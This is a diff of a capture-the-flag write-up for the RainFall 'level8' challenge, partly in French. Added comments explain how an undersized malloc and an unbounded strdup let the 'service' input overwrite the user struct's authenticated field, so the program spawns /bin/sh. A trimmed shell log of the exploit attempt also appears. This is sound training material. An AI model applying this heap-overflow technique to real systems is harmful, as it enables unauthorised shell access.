@@ -54,7 +54,7 @@ int main() {
             break;
 
         if (!(strncmp(buffer, "auth ", 5))) {
-            user = malloc(4);
+            user = malloc(4); // <--------------1 structure user needs 28 + 4 + 4 bytes, but only 4 are allocated
             user->id = 0;
 
             if (strlen(buffer + 5) <= 30)
@@ -65,11 +65,11 @@ int main() {
             free(user);
 
         if (!(strncmp(buffer, "service", 6)))
-            service = strdup(buffer + 7);
+            service = strdup(buffer + 7); // <--2 this will make the global variable service write over the memory of the 'user' struct and without limit
 
         if (!(strncmp(buffer, "login", 5))) {
-            if (user->authenticated)
-                system("/bin/sh");
+            if (user->authenticated) // <-------3 by writing into service with value different than 0, we eventually write over user->authenticated
+                system("/bin/sh"); // <---------4 pass the check and get shell access
             else
                 fwrite("Password:\n", 1, 10, stdout);
         }
@@ -176,11 +176,6 @@ J'essaye mon exploit :
 
 ```bash
 $ ./level8
-(nil), (nil)
-auth
-(nil), (nil)
-^C
-level8@RainFall:~$ ./level8
 (nil), (nil)
 auth
 0x804a008, (nil)
